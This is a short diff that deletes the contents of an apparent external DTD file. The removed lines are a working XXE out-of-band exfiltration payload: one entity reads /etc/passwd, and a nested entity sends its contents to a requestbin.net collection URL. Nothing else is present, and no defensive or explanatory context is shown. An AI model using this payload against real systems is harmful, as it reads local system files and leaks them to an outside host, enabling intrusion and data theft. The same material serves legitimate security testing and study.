@@ -1,2 +1,0 @@
-<!ENTITY % payl SYSTEM "file:///etc/passwd">
-<!ENTITY % intern "<!ENTITY &#37; trick SYSTEM 'http://requestbin.net/r/1m2xehr1?%payl;'>">
